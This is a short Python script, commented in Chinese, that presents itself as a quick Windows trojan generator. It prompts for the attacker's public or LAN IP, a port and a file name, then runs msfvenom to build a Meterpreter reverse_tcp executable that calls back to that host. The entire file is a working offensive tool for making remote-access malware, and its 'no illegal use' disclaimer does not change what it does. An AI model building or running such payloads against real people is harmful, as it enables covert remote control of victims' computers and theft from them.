import socket
import os
import requests
# 定义基本变量
tool_version = "0.0.2"
# 工具介绍
print("这是一个基于msfvenom命令开发的Windows木马快速生成工具 Version: " + tool_version)
print("开发者:Teror Fox    Github:https://github.com/sysfox")
print("禁止用于任何非法用途")
# 主体部分

# 判断使用公网/局域网IP地址
hosttype= input("是否使用公网IP(y/n): ")
if hosttype == "y" :
   lhost = requests.get('https://ifconfig.me/ip').text.strip()
   print("您已选择使用公网IP地址: " + lhost)
else :
   print("您已选择使用局域网IP")
   lhost = input("请输入您的局域网IP地址: ")
   print("局域网IP地址已设定: " + lhost)
# 设定监听端口
lport = input("请输入监听端口: ")
# ftype = input("文件类型为(默认为exe): ") 
fname = input("文件名为: ") + ".exe"
wc = "msfvenom" + " -p windows/meterpreter/reverse_tcp" + " LHOST=" + lhost + " LPORT=" + lport + " -f exe" + " -o " + fname
result = os.system(wc)
print(result)
